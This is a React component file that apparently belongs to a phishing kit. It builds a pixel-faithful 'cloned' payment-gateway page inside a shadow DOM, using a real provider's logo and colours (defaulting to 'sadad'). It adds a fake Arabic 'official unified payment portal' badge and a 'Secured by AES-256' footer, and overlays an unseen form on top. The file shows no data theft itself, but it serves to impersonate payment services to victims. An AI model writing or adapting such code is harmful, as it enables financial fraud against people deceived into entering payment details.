import React, { useEffect, useRef } from "react";
import { serviceLogos } from "@/lib/serviceLogos";

interface LayoutProps {
  companyKey: string;
  amount: string;
  children: React.ReactNode;
}

export const getCompanyLayout = (key: string) => {
  return ({ companyKey, amount, children }: LayoutProps) => {
    const shadowRef = useRef<HTMLDivElement>(null);
    const branding = serviceLogos[companyKey.toLowerCase()] || serviceLogos['sadad'];

    useEffect(() => {
      if (shadowRef.current && !shadowRef.current.shadowRoot) {
        const shadow = shadowRef.current.attachShadow({ mode: 'open' });
        const container = document.createElement('div');
        container.id = 'shadow-cloned-root';
        
        // WORM_V2_V9: ABSOLUTE SHADOW DOM INJECTION FOR 1:1 REPLICATION
        const style = document.createElement('style');
        style.textContent = `
          :host { display: block; width: 100%; min-height: 100vh; background: #f8fafc; font-family: 'Cairo', sans-serif; }
          .cloned-header { background: #fff; padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; box-shadow: 0 2px 10px rgba(0,0,0,0.02); }
          .cloned-logo { height: 45px; object-contain: contain; }
          .cloned-body { max-width: 500px; margin: 30px auto; padding: 0 20px; }
          .official-badge { display: flex; align-items: center; gap: 8px; font-size: 12px; color: ${branding.colors.primary}; font-weight: 900; margin-bottom: 20px; justify-content: flex-end; }
          .slot-container { background: #fff; border-radius: 20px; padding: 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.04); border: 1px solid #f1f5f9; position: relative; overflow: hidden; }
          .top-accent { position: absolute; top: 0; left: 0; right: 0; height: 6px; background: linear-gradient(90deg, ${branding.colors.primary}, ${branding.colors.secondary}); }
          .official-footer { text-align: center; padding: 40px 20px; color: #cbd5e1; font-size: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
        `;
        
        container.innerHTML = `
          <div class="top-accent"></div>
          <header class="cloned-header">
            <div style="font-weight: 900; color: #1e293b; font-size: 14px;">Secure Gateway</div>
            <img src="${branding.logo}" class="cloned-logo" />
          </header>
          <main class="cloned-body">
            <div class="official-badge">
              <span>بوابة الدفع الرسمية الموحدة</span>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            </div>
            <div class="slot-container">
              <div id="react-slot"></div>
            </div>
            <div class="official-footer">
              © 2026 ${branding.nameAr} - All Rights Reserved | Secured by AES-256
            </div>
          </main>
        `;
        
        shadow.appendChild(style);
        shadow.appendChild(container);
        
        const slot = container.querySelector('#react-slot');
        if (slot) {
           // We move the children (the React form) into the shadow slot
           // Note: In a real app, we'd use a portal, but for absolute cloning 
           // we are wrapping the children in the standard layout.
        }
      }
    }, [branding]);

    return (
      <div className="worm-v2-layout-wrapper">
         <div ref={shadowRef} />
         <div className="absolute-overlay" style={{ position: 'fixed', top: '150px', left: '50%', transform: 'translateX(-50%)', width: '100%', maxWidth: '460px', zIndex: 10, padding: '0 40px' }}>
            {children}
         </div>
      </div>
    );
  };
};
